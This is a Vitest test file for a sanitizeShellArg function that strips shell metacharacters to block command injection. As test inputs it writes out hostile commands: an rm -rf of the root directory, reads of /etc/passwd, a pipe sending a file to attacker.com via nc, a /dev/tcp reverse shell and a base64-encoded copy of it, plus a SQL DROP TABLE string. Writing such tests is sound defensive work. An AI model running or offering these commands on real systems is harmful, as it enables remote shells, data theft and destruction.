/**
 * Tests for sanitizeShellArg function
 * Security-critical: prevents command injection attacks
 */

import { describe, it, expect } from 'vitest';
import { sanitizeShellArg } from '../../../src/utils/security.js';

describe('sanitizeShellArg', () => {
  describe('safe strings', () => {
    it('should pass alphanumeric strings unchanged', () => {
      expect(sanitizeShellArg('hello')).toBe('hello');
      expect(sanitizeShellArg('test123')).toBe('test123');
      expect(sanitizeShellArg('HelloWorld')).toBe('HelloWorld');
    });

    it('should pass filenames with extensions', () => {
      expect(sanitizeShellArg('file.txt')).toBe('file.txt');
      expect(sanitizeShellArg('image.png')).toBe('image.png');
      expect(sanitizeShellArg('script.js')).toBe('script.js');
    });

    it('should pass paths with slashes', () => {
      expect(sanitizeShellArg('src/index.ts')).toBe('src/index.ts');
      expect(sanitizeShellArg('/usr/local/bin')).toBe('/usr/local/bin');
    });

    it('should pass strings with spaces', () => {
      expect(sanitizeShellArg('hello world')).toBe('hello world');
      expect(sanitizeShellArg('my file.txt')).toBe('my file.txt');
    });

    it('should pass strings with hyphens and underscores', () => {
      expect(sanitizeShellArg('my-file')).toBe('my-file');
      expect(sanitizeShellArg('my_file')).toBe('my_file');
      expect(sanitizeShellArg('my-file_name')).toBe('my-file_name');
    });
  });

  describe('command injection attacks', () => {
    it('should remove semicolons (command chaining)', () => {
      expect(sanitizeShellArg('test; rm -rf /')).toBe('test rm -rf /');
      expect(sanitizeShellArg('echo hello; cat /etc/passwd')).toBe('echo hello cat /etc/passwd');
    });

    it('should remove ampersands (background execution)', () => {
      expect(sanitizeShellArg('test && cat /etc/passwd')).toBe('test  cat /etc/passwd');
      expect(sanitizeShellArg('cmd & background')).toBe('cmd  background');
    });

    it('should remove pipes (command piping)', () => {
      expect(sanitizeShellArg('ls | grep password')).toBe('ls  grep password');
      expect(sanitizeShellArg('cat file | nc attacker.com 1234')).toBe('cat file  nc attacker.com 1234');
    });

    it('should remove backticks (command substitution)', () => {
      expect(sanitizeShellArg('`whoami`')).toBe('whoami');
      expect(sanitizeShellArg('hello `id` world')).toBe('hello id world');
    });

    it('should remove dollar signs (variable expansion)', () => {
      expect(sanitizeShellArg('$PATH')).toBe('PATH');
      expect(sanitizeShellArg('${HOME}')).toBe('HOME');
      expect(sanitizeShellArg('$(whoami)')).toBe('whoami');
    });

    it('should remove parentheses (subshell execution)', () => {
      expect(sanitizeShellArg('$(id)')).toBe('id');
      expect(sanitizeShellArg('(cat /etc/passwd)')).toBe('cat /etc/passwd');
    });

    it('should remove curly braces', () => {
      expect(sanitizeShellArg('${var}')).toBe('var');
      expect(sanitizeShellArg('{a,b,c}')).toBe('a,b,c');
    });

    it('should remove square brackets', () => {
      expect(sanitizeShellArg('test[0]')).toBe('test0');
      expect(sanitizeShellArg('[[ condition ]]')).toBe(' condition ');
    });

    it('should remove angle brackets (redirection)', () => {
      expect(sanitizeShellArg('echo hello > /tmp/file')).toBe('echo hello  /tmp/file');
      expect(sanitizeShellArg('cat < /etc/passwd')).toBe('cat  /etc/passwd');
      expect(sanitizeShellArg('cmd >> /tmp/log')).toBe('cmd  /tmp/log');
    });

    it('should remove backslashes (escape sequences)', () => {
      expect(sanitizeShellArg('hello\\nworld')).toBe('hellonworld');
      expect(sanitizeShellArg('test\\"quote')).toBe('test"quote');
    });

    it('should remove exclamation marks (history expansion)', () => {
      expect(sanitizeShellArg('!!')).toBe('');
      expect(sanitizeShellArg('!$')).toBe('');
      expect(sanitizeShellArg('hello!')).toBe('hello');
    });

    it('should remove hash (comments)', () => {
      expect(sanitizeShellArg('cmd # comment')).toBe('cmd  comment');
    });

    it('should remove asterisks (glob expansion)', () => {
      expect(sanitizeShellArg('*.txt')).toBe('.txt');
      expect(sanitizeShellArg('/tmp/*')).toBe('/tmp/');
    });

    it('should remove question marks (single char glob)', () => {
      expect(sanitizeShellArg('file?.txt')).toBe('file.txt');
    });

    it('should remove tildes (home directory)', () => {
      expect(sanitizeShellArg('~/secret')).toBe('/secret');
      expect(sanitizeShellArg('~root/.ssh')).toBe('root/.ssh');
    });

    it('should remove newlines and carriage returns', () => {
      expect(sanitizeShellArg('line1\nline2')).toBe('line1line2');
      expect(sanitizeShellArg('line1\r\nline2')).toBe('line1line2');
    });
  });

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeShellArg('')).toBe('');
    });

    it('should handle null/undefined', () => {
      expect(sanitizeShellArg(null as unknown as string)).toBe('');
      expect(sanitizeShellArg(undefined as unknown as string)).toBe('');
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(10000);
      expect(sanitizeShellArg(longString)).toBe(longString);
      expect(sanitizeShellArg(longString).length).toBe(10000);
    });

    it('should handle strings with only dangerous characters', () => {
      expect(sanitizeShellArg(';|&`$(){}')).toBe('');
      expect(sanitizeShellArg('<>\\!#*?~')).toBe('');
    });

    it('should handle mixed safe and dangerous characters', () => {
      expect(sanitizeShellArg('hello;world')).toBe('helloworld');
      expect(sanitizeShellArg('test$(cmd)end')).toBe('testcmdend');
    });

    it('should handle unicode characters', () => {
      expect(sanitizeShellArg('hello\u4e16\u754c')).toBe('hello\u4e16\u754c');
      expect(sanitizeShellArg('\u65e5\u672c\u8a9e')).toBe('\u65e5\u672c\u8a9e');
    });

    it('should preserve quotes (single and double)', () => {
      expect(sanitizeShellArg('"quoted"')).toBe('"quoted"');
      expect(sanitizeShellArg("'single'")).toBe("'single'");
    });
  });

  describe('real-world attack patterns', () => {
    it('should neutralize reverse shell attempts', () => {
      const attack = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
      const sanitized = sanitizeShellArg(attack);
      expect(sanitized).not.toContain('>');
      expect(sanitized).not.toContain('&');
    });

    it('should neutralize SQL-style injection', () => {
      const attack = "'; DROP TABLE users; --";
      const sanitized = sanitizeShellArg(attack);
      expect(sanitized).not.toContain(';');
    });

    it('should neutralize encoded attacks', () => {
      // Base64-encoded command
      const attack = '$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash)';
      const sanitized = sanitizeShellArg(attack);
      expect(sanitized).not.toContain('$');
      expect(sanitized).not.toContain('(');
      expect(sanitized).not.toContain('|');
    });
  });
});
